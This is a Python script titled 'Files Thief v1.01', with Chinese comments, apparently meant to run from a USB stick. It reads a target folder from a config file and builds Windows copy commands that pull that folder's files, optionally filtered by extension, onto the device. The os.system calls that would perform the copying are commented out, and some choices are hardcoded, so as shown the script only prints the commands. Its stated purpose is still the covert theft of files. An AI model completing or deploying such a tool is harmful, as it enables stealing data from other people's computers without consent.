# Files Thief v1.01
# 1.预期实现功能：插入设备并运行脚本后能根据预先配置复制设备的相关文件

#.ini 配置文件：目标文件夹地址 单次复制文件的最大值(GB) 1GB = 1048576kb

import os
from time import sleep
from Get_FilesAndDoc import Get_FilesPath,Get_AllFiles

LocalPath = os.getcwd()
OpenPath = LocalPath + r"\UsbHackerini.ini"
UsbHackerini = open(OpenPath,"r")
# 获取本脚本的运行路径并指定为配置文件以及复制文件的保存路径

Settings = []
while True:
    ini_read = UsbHackerini.readline()
    if ini_read == "END":
        break
    else:
        Settings.append(ini_read.replace("\n",""))# replace 方法替换转义字符为空字符串
# 配置文件读取并处理
CopyPath = Settings[0]
Mix_GB = int(Settings[1]) * 1048576


print("1 ==> 提取目录下所有文件")
print("2 ==> 键入格式名以提取特定格式的文件")
print("3 ==> 提取目标目录以及子目录的特定文件")
Copy_Choice = 3#int(input("请输入目标指令："))

if Copy_Choice == 1:

    FilesPath = Get_FilesPath(CopyPath)

    for SingleFile in FilesPath:
        Command = 'copy ' + SingleFile + ' ' + LocalPath
        print(Command)
        # os.system(Command)
   
    UsbHackerini.close()
   
elif Copy_Choice == 2:

    TargetEnd = "dll"#input("请输入文件的后缀名：")
    FilesPath = Get_FilesPath(CopyPath)
    
    for SingleFile in FilesPath:

        FilesPath_listed = list(SingleFile)
        FilesNameLength = len(FilesPath_listed) - 3
        FilesEnd = ""

        for x in range(0,3):
            FilesEnd = FilesEnd + FilesPath_listed[FilesNameLength]
            FilesNameLength = FilesNameLength + 1
        # 提取读取文件的后缀名并用FilesEnd接受
        if FilesEnd == TargetEnd:
            Command = 'copy ' + SingleFile + ' ' + LocalPath
            print(Command)
            # os.system(Command)
        # 通过判断后缀格式筛选索要复制的文件
    UsbHackerini.close()

elif Copy_Choice == 3:

    TargetEnd = "dll"#input("请输入文件的后缀名：")
    FilesPath = Get_AllFiles(CopyPath)
    
    for SingleFile in FilesPath:

        FilesPath_listed = list(SingleFile)
        FilesNameLength = len(FilesPath_listed) - 3
        FilesEnd = ""

        for x in range(0,3):
            FilesEnd = FilesEnd + FilesPath_listed[FilesNameLength]
            FilesNameLength = FilesNameLength + 1
        # 提取读取文件的后缀名并用FilesEnd接受
        if FilesEnd == TargetEnd:
            Command = 'copy ' + CopyPath + '\\' + SingleFile + ' ' + LocalPath
            print(Command)
            # os.system(Command)
        # 通过判断后缀格式筛选索要复制的文件
    UsbHackerini.close()

else:
    print("error")
    UsbHackerini.close()
    sleep(3)
# cmd 的 copy 命令 copy 文件路径 目标路径